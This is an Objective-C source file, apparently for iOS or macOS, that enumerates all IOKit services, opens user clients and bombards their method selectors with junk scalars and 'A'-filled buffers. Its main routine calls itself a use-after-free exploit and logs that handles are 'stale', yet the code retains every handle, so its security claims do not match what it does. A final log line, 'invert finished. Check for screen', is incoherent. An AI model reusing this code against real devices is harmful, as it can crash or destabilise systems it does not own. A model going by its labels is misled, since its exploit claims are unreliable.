#import "DynamicFuzzer.h"
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>

@interface DynamicFuzzer()
@property (nonatomic, assign, readwrite) BOOL isFuzzing;
@end

@implementation DynamicFuzzer

- (void)startFuzzingWithLogHandler:(void (^)(NSString *logMessage))logHandler {
    if (self.isFuzzing) return;
    self.isFuzzing = YES;
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self runUAFExploit:logHandler];
    });
}

- (void)stopFuzzing {
    self.isFuzzing = NO;
}

- (void)fuzzConnection:(io_connect_t)connection forServiceName:(const char *)serviceName {
    for (uint32_t selector = 0; selector < 32; selector++) {
        IOConnectCallMethod(connection, selector, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        uint64_t scalar_inputs[] = { 0, 1, 0xFFFFFFFF, 0xDEADBEEF, (uint64_t)-1 };
        for (int i = 0; i < sizeof(scalar_inputs)/sizeof(scalar_inputs[0]); i++) {
             IOConnectCallScalarMethod(connection, selector, &scalar_inputs[i], 1, NULL, NULL);
        }
        size_t struct_size = 1024;
        void *struct_input = malloc(struct_size);
        if (!struct_input) continue;
        memset(struct_input, 'A', struct_size);
        IOConnectCallMethod(connection, selector, NULL, 0, struct_input, struct_size, NULL, NULL, NULL, NULL);
        free(struct_input);
    }
}

- (void)runUAFExploit:(void (^)(NSString *logMessage))logHandler {
    logHandler(@"Running UaF...");
    
    io_iterator_t iterator;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching("IOService"), &iterator);
    if (kr != KERN_SUCCESS) { [self stopFuzzing]; return; }
    
    NSMutableArray *storedTargets = [NSMutableArray array];
    io_service_t service;
    while ((service = IOIteratorNext(iterator))) {
        IOObjectRetain(service);
        [storedTargets addObject:[NSValue valueWithPointer:(void*)service]];
    }
    
    IOObjectRelease(iterator);
    logHandler(@"[1] complete. Handles are now stale.");

    for (int pass = 1; pass <= 2; pass++) {
        logHandler([NSString stringWithFormat:@"Executing Pass %d/2...", pass]);
        
        for (NSValue *targetValue in storedTargets) {
            if (!self.isFuzzing) break;

            @autoreleasepool {
                
                io_service_t stale_handle = (io_service_t)[targetValue pointerValue];
                
                io_name_t name;
                IORegistryEntryGetName(stale_handle, name);
                
                io_connect_t connection;
                for (uint32_t type = 0; type < 4; type++) {
                    if (IOServiceOpen(stale_handle, mach_task_self(), type, &connection) == KERN_SUCCESS) {
                        [self fuzzConnection:connection forServiceName:name];
                        IOServiceClose(connection);
                        break;
                    }
                }
            }
        }
        if (!self.isFuzzing) break;
    }

    for (NSValue *targetValue in storedTargets) {
        IOObjectRelease((io_service_t)[targetValue pointerValue]);
    }
    
    logHandler(@"invert finished. Check for screen");
    dispatch_async(dispatch_get_main_queue(), ^{
        [self stopFuzzing];
    });
}

@end
